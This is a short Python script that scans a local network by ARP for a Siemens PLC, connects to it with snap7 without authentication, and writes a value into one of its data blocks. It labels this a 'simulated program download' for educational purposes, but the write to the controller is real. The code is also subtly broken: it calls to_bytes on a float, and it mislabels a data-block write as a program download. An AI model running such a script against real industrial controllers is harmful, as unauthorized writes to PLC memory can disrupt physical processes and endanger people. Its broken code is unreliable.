import socket
import struct
import time
import snap7
from snap7.util import get_bool, set_bool, get_real, set_real
from scapy.all import ARP, Ether, srp

# Function to find the PLC IP via ARP scanning
def find_plc_ip(network_ip="192.168.1.0/24"):
    print("[*] Scanning network to locate PLC...")
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)
    answered_list = srp(arp_request, timeout=2, verbose=False)[0]
    
    for _, recv_packet in answered_list:
        ip = recv_packet.psrc
        mac = recv_packet.hwsrc
        print(f"[+] Found device - IP: {ip}, MAC: {mac}")
        # Potential heuristic: Check for Siemens PLC MAC Address Vendors
        if mac.startswith("00:0E:CF"):  # Example Siemens MAC vendor prefix
            print(f"[+] Siemens PLC identified at {ip}")
            return ip
    print("[-] No Siemens PLC found on the network.")
    return None

# Function to establish a connection to the PLC
def connect_to_plc(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    plc = snap7.client.Client()
    try:
        plc.connect(plc_ip, 0, 1)  # Rack and Slot may vary; defaults are Rack=0, Slot=1
        if plc.get_connected():
            print("[+] Successfully connected to the PLC.")
            return plc
    except Exception as e:
        print(f"[-] Failed to connect to PLC: {e}")
    return None

# Function to simulate a program download (educational purpose only)
def program_download(plc):
    print("[*] Simulating program download to the PLC...")
    try:
        # Example: Writing data to a specific DB (Data Block)
        db_number = 1  # Target Data Block
        start_address = 0
        data = (5.5).to_bytes(4, byteorder="big")  # Example data to write to DB
        
        plc.db_write(db_number, start_address, data)
        print("[+] Simulated program download completed.")
    except Exception as e:
        print(f"[-] Failed to perform program download: {e}")

# Main function to orchestrate the tasks
def main():
    print("[*] Starting PLC interaction script...")
    
    # Step 1: Find PLC IP
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("[-] Exiting: No PLC found.")
        return
    
    # Step 2: Connect to the PLC
    plc = connect_to_plc(plc_ip)
    if not plc:
        print("[-] Exiting: Unable to connect to PLC.")
        return
    
    # Step 3: Perform program download simulation
    program_download(plc)
    
    # Close the connection
    print("[*] Closing PLC connection...")
    plc.disconnect()
    print("[+] Script complete.")

# Execute the script
if __name__ == "__main__":
    main()